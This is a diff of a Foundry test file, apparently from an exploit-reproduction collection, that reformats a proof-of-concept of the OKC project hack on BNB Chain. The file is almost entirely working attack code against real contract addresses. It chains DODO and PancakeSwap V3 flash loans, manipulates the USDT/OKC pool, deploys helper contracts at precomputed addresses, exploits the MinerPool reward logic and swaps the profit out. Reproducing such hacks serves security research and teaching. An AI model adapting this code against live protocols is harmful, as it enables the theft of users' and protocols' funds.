@@ -4,18 +4,12 @@ pragma solidity ^0.8.13;
 import {Test, console2} from "forge-std/Test.sol";
 import "../interface.sol";
 
-
 // @Analysis
 // https://lunaray.medium.com/okc-project-hack-analysis-0907312f519b
 // @TX
 // https://dashboard.tenderly.co/tx/bnb/0xd85c603f71bb84437bc69b21d785f982f7630355573566fa365dbee4cd236f08
 
-
-
-
 contract ContractTest is Test {
-
-
     AttackContract public attack_contract;
 
     function setUp() public {
@@ -42,21 +36,16 @@ contract ContractTest is Test {
         vm.label(address(attack_contract.pancakeRouter()), "PancakeRouter");
     }
 
-
     function testExploit() public {
         // 0.000000000000000001
         attack_contract.expect1{value: 1 ether}();
     }
-
-
 }
-
 
 contract AttackContract is IDODOCallee {
     uint256 public nonce = 1;
     AttackContract2 public attack_contract1;
     AttackContract2 public attack_contract2;
-
 
     IERC20 public USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 public OKC = IERC20(0xABba891c633Fb27f8aa656EA6244dEDb15153fE0);
@@ -71,36 +60,64 @@ contract AttackContract is IDODOCallee {
     IPancakeRouter public pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IPancakePair public pancakePair_USDT_OKC = IPancakePair(0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96);
 
-
     function approveAll() internal {
         OKC.approve(address(pancakeRouter), type(uint256).max);
         pancakePair_USDT_OKC.approve(address(pancakeRouter), type(uint256).max);
     }
 
-
     function expect1() external payable {
         uint256 size;
         address aaa = address(this);
-        assembly {size := extcodesize(aaa)}
+        assembly {
+            size := extcodesize(aaa)
+        }
         console2.log("transfer_all size is: ", size);
         approveAll();
-        console2.log("minerPool OKC: ", OKC.balanceOf(address(minerPool)), ", ", uint256(OKC.balanceOf(address(minerPool)) / 1e18));
-        console2.log("LP USDT: ", USDT.balanceOf(address(pancakePair_USDT_OKC)), ", ", uint256(USDT.balanceOf(address(pancakePair_USDT_OKC)) / 1e18));
-        console2.log("LP OKC: ", OKC.balanceOf(address(pancakePair_USDT_OKC)), ", ", uint256(OKC.balanceOf(address(pancakePair_USDT_OKC)) / 1e18));
+        console2.log(
+            "minerPool OKC: ",
+            OKC.balanceOf(address(minerPool)),
+            ", ",
+            uint256(OKC.balanceOf(address(minerPool)) / 1e18)
+        );
+        console2.log(
+            "LP USDT: ",
+            USDT.balanceOf(address(pancakePair_USDT_OKC)),
+            ", ",
+            uint256(USDT.balanceOf(address(pancakePair_USDT_OKC)) / 1e18)
+        );
+        console2.log(
+            "LP OKC: ",
+            OKC.balanceOf(address(pancakePair_USDT_OKC)),
+            ", ",
+            uint256(OKC.balanceOf(address(pancakePair_USDT_OKC)) / 1e18)
+        );
 
         uint256 amount = USDT.balanceOf(address(DPP1));
         DPP1.flashLoan(0, amount, address(this), "0");
         uint256 shengyu = USDT.balanceOf(address(this));
         console2.log("usdt amount profit: ", shengyu, " ", uint256(shengyu / 1e18));
 
-        console2.log("minerPool OKC: ", OKC.balanceOf(address(minerPool)), ", ", uint256(OKC.balanceOf(address(minerPool)) / 1e18));
-        console2.log("LP USDT: ", USDT.balanceOf(address(pancakePair_USDT_OKC)), ", ", uint256(USDT.balanceOf(address(pancakePair_USDT_OKC)) / 1e18));
-        console2.log("LP OKC: ", OKC.balanceOf(address(pancakePair_USDT_OKC)), ", ", uint256(OKC.balanceOf(address(pancakePair_USDT_OKC)) / 1e18));
+        console2.log(
+            "minerPool OKC: ",
+            OKC.balanceOf(address(minerPool)),
+            ", ",
+            uint256(OKC.balanceOf(address(minerPool)) / 1e18)
+        );
+        console2.log(
+            "LP USDT: ",
+            USDT.balanceOf(address(pancakePair_USDT_OKC)),
+            ", ",
+            uint256(USDT.balanceOf(address(pancakePair_USDT_OKC)) / 1e18)
+        );
+        console2.log(
+            "LP OKC: ",
+            OKC.balanceOf(address(pancakePair_USDT_OKC)),
+            ", ",
+            uint256(OKC.balanceOf(address(pancakePair_USDT_OKC)) / 1e18)
+        );
     }
 
-
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
-
         if (keccak256(data) == keccak256(bytes("0"))) {
             uint256 amount = USDT.balanceOf(address(DPP2));
             DPP2.flashLoan(0, amount, address(this), "1");
@@ -119,7 +136,12 @@ contract AttackContract is IDODOCallee {
             USDT.transfer(address(DPP4), quoteAmount);
         } else if (keccak256(data) == keccak256(bytes("4"))) {
             uint256 amount = USDT.balanceOf(address(DPP5));
-            pancakeV3Pool.flash(address(this), 2500_000_000_000_000_000_000_000, 0, abi.encodePacked(uint256(2500_000_000_000_000_000_000_000)));
+            pancakeV3Pool.flash(
+                address(this),
+                2_500_000_000_000_000_000_000_000,
+                0,
+                abi.encodePacked(uint256(2_500_000_000_000_000_000_000_000))
+            );
             USDT.transfer(address(DPP5), quoteAmount);
         }
     }
@@ -130,12 +152,10 @@ contract AttackContract is IDODOCallee {
         console2.log("usdt amount: ", ust_amount, ", ", uint256(ust_amount / 1e18));
         console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");
 
-
         swap();
         mint();
         USDT.transfer(address(pancakeV3Pool), amount_flash + fee0);
     }
-
 
     function swap() private {
         console2.log("--- Step 1: Redeem OKC with Borrowed Points USDT");
@@ -143,23 +163,20 @@ contract AttackContract is IDODOCallee {
         a[0] = address(USDT);
         a[1] = address(OKC);
 
-        uint256 reserve0= USDT.balanceOf(address(pancakePair_USDT_OKC));
-        uint256 reserve1= OKC.balanceOf(address(pancakePair_USDT_OKC));
-        console2.log("LP swap before reserves = ", reserve0, ", ",reserve1);
+        uint256 reserve0 = USDT.balanceOf(address(pancakePair_USDT_OKC));
+        uint256 reserve1 = OKC.balanceOf(address(pancakePair_USDT_OKC));
+        console2.log("LP swap before reserves = ", reserve0, ", ", reserve1);
 
         uint256[] memory out = pancakeRouter.getAmountsOut(130_000_000_000_000_000_000_000, a);
         //assert(out[0] == 130000000000000000000000);
         //assert(out[1] == 28109225547221109324317);
         pancakePair_USDT_OKC.swap(
-            1,
-            28108225547221109324317,
-            address(this),
-            abi.encodePacked(uint256(130_000_000_000_000_000_000_000))
+            1, 28_108_225_547_221_109_324_317, address(this), abi.encodePacked(uint256(130_000_000_000_000_000_000_000))
         );
 
-        uint256 reserve011= USDT.balanceOf(address(pancakePair_USDT_OKC));
-        uint256 reserve122= OKC.balanceOf(address(pancakePair_USDT_OKC));
-        console2.log("LP swap after reserves = ", reserve011, ", ",reserve122);
+        uint256 reserve011 = USDT.balanceOf(address(pancakePair_USDT_OKC));
+        uint256 reserve122 = OKC.balanceOf(address(pancakePair_USDT_OKC));
+        console2.log("LP swap after reserves = ", reserve011, ", ", reserve122);
 
         uint256 usdt_amount = USDT.balanceOf(address(this));
         uint256 okc_amount = OKC.balanceOf(address(this));
@@ -168,11 +185,9 @@ contract AttackContract is IDODOCallee {
         console2.log("usdt amount(swap end): ", usdt_amount, ", ", uint256(usdt_amount / 1e18));
         console2.log("okc amount(swap end): ", okc_amount, ", ", uint256(okc_amount / 1e18));
         console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");
-
     }
 
     function mint() private {
-
         console2.log("--- Step 2: Staking Liquidity");
         address new_attack_contract1 = calculateAddress(address(this), nonce);
         console2.log("Advance Calculation Contract Address(new_attack_contract2): ", new_attack_contract1);
@@ -182,7 +197,9 @@ contract AttackContract is IDODOCallee {
 
         nonce++;
         uint256 size;
-        assembly {size := extcodesize(new_attack_contract1)}
+        assembly {
+            size := extcodesize(new_attack_contract1)
+        }
         console2.log("transfer_all size is: ", size);
 
         address new_attack_contract2 = calculateAddress(address(this), nonce);
@@ -193,23 +210,19 @@ contract AttackContract is IDODOCallee {
         attack_contract2 = new AttackContract2();
         //vm.label(address(attack_contract3), "AttackContract3");
 
-
-        (uint112 reserve0,uint112 reserve1,uint32 blockTimeLast) = pancakePair_USDT_OKC.getReserves();
+        (uint112 reserve0, uint112 reserve1, uint32 blockTimeLast) = pancakePair_USDT_OKC.getReserves();
         //assert(reserve0 == 139293866156595223760844);
         //assert(reserve1 == 2015600963959283799829);
         console2.log("getReserves: ", reserve0, reserve1, blockTimeLast);
         uint256 okc_amount3 = OKC.balanceOf(address(this));
 
-
         uint256 amountb = pancakeRouter.quote(okc_amount3, reserve1, reserve0);
         //assert(amountb == 1884223603791570904823359);
         USDT.transfer(address(pancakePair_USDT_OKC), amountb);
 
-
         uint256 okc_amount4 = OKC.balanceOf(address(this));
         //assert(okc_amount4 == 27264968780804476044587);
         OKC.transfer(address(pancakePair_USDT_OKC), okc_amount4);
-
 
         uint256 lp1 = pancakePair_USDT_OKC.mint(address(this));
         //assert(lp1 == 225705840317082411194413);
@@ -217,12 +230,9 @@ contract AttackContract is IDODOCallee {
         console2.log("attack_contract1 lp = ", pancakePair_USDT_OKC.balanceOf(address(attack_contract1)));
         console2.log("attack_contract2 lp = ", pancakePair_USDT_OKC.balanceOf(address(attack_contract2)));
 
-
-
         uint256 lp_amount1 = pancakePair_USDT_OKC.balanceOf(address(this));
         console2.log("this LP: ", lp_amount1);
         pancakePair_USDT_OKC.transfer(address(attack_contract2), lp_amount1);
-
 
         console2.log("--- Step 3: Main attack point");
         // MinerPool.call{value: 1 wei}(""); // Attackers use this method
@@ -234,7 +244,9 @@ contract AttackContract is IDODOCallee {
 
         uint256 lp_amount2 = pancakePair_USDT_OKC.balanceOf(address(this));
         //assert(225705840317082411194413 == lp_amount2);
-        (uint256 a,uint256 b) = pancakeRouter.removeLiquidity(address(OKC), address(USDT), lp_amount2, 0, 0, address(this), block.timestamp + 1000);
+        (uint256 a, uint256 b) = pancakeRouter.removeLiquidity(
+            address(OKC), address(USDT), lp_amount2, 0, 0, address(this), block.timestamp + 1000
+        );
         //assert(a == 27264977626947917860405);
         //assert(b == 1884223603891570904823358);
 
@@ -245,29 +257,23 @@ contract AttackContract is IDODOCallee {
         uint256 tmp3 = attack_contract2.transfer_all(address(OKC), address(this));
         //assert(tmp3 == 77890958849117701118009);
 
-
         console2.log("--- Step 4: Withdraw earnings");
         uint256 okc_amount5 = OKC.balanceOf(address(this));
         //assert(104610636835065226203047 == okc_amount5);
-
 
         address[] memory path = new address[](2);
 
         path[0] = address(OKC);
         path[1] = address(USDT);
 
-        console2.log("okc amount = ", OKC.balanceOf(address(this)),", ",OKC.balanceOf(address(this))/1e18);
+        console2.log("okc amount = ", OKC.balanceOf(address(this)), ", ", OKC.balanceOf(address(this)) / 1e18);
         console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");
         console2.log("swap OKC to USDT");
         pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            okc_amount5,
-            0,
-            path,
-            address(this),
-            block.timestamp + 1000
+            okc_amount5, 0, path, address(this), block.timestamp + 1000
         );
         console2.log("1 okc = ", uint256(getTokenPrice()), " usdt");
-        console2.log("usdt amount = ", USDT.balanceOf(address(this)),", ",USDT.balanceOf(address(this))/1e18);
+        console2.log("usdt amount = ", USDT.balanceOf(address(this)), ", ", USDT.balanceOf(address(this)) / 1e18);
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
@@ -277,7 +283,6 @@ contract AttackContract is IDODOCallee {
         console2.log("LP USDT: ", USDT.balanceOf(address(pancakePair_USDT_OKC)));
         console2.log("LP OKC: ", OKC.balanceOf(address(pancakePair_USDT_OKC)));
     }
-
 
     function getTokenPrice() public view returns (uint256) {
         address[] memory path = new address[](2);
@@ -302,16 +307,15 @@ contract AttackContract is IDODOCallee {
         } else {
             data = abi.encodePacked(bytes1(0xda), bytes1(0x94), creator, bytes1(0x84), uint32(nonce));
         }
-        return address(uint160(uint(keccak256(data))));
+        return address(uint160(uint256(keccak256(data))));
     }
-
-
 }
 
 contract AttackContract2 {
     IERC20 public USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 public OKC = IERC20(0xABba891c633Fb27f8aa656EA6244dEDb15153fE0);
     IPancakePair public PancakePair_USDT_OKC = IPancakePair(0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96);
+
     constructor() {
         uint256 amount = USDT.balanceOf(address(this));
         USDT.transfer(address(PancakePair_USDT_OKC), amount);
@@ -319,11 +323,12 @@ contract AttackContract2 {
         OKC.transfer(address(PancakePair_USDT_OKC), amount2);
     }
 
-
     function transfer_all(address token, address to) public returns (uint256) {
         uint256 size;
         address aaa = address(this);
-        assembly {size := extcodesize(aaa)}
+        assembly {
+            size := extcodesize(aaa)
+        }
         console2.log("transfer_all size is: ", size);
         uint256 amount = IERC20(token).balanceOf(address(this));
         if (IERC20(token).transfer(to, amount)) {
@@ -332,8 +337,4 @@ contract AttackContract2 {
             revert("transfer error");
         }
     }
-
 }
-
-
-
